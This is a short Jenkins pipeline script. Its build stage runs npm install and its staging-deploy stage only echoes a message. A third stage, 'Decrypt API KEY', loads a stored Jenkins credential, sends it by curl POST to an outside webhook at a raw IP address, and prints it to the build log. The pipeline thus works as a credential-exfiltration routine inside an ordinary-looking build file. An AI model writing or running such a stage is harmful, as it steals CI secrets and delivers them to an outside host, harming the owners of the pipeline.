node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Jenkins Credentials | Decrypt API KEY') {
      withCredentials([string(credentialsId: 'AQAAABAAAAAwR01R+EmkSY9zH/H5Afa4mDsnrGswdy1ZfKIswn+c/qg+THXlRsBn04FjECTSQYokV8Nk8BxPZZXzqBAuWDauxA==',
                              variable: 'secretText')]) {
        apiKey = "\nAPI key: ${secretText}\n"
        sh '''
        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://35.219.145.13:5000/webhook'
        '''
      }
      println apiKey
    }
}